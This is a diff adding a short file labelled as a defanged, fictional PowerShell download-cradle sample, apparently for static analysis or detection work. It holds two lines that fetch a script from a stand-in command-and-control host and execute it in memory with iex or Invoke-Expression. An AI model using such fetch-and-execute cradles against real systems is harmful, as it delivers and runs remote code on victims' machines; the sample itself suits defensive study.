@@ -1,0 +1,8 @@
+# Download Cradle Stager Sample (Defanged, Fictional — Static Read Only)
+
+# Canonical Download Cradle (Fetch + Eval in Memory)
+iex ([System.Net.WebClient]::new().DownloadString('hxxps://cdn.fake-c2[.]test/a.ps1'))
+
+# Alternative Variable-Bound Pivot
+$payload = [System.Net.WebClient]::new().DownloadString('hxxps://cdn.fake-c2[.]test/b.ps1')
+Invoke-Expression $payload
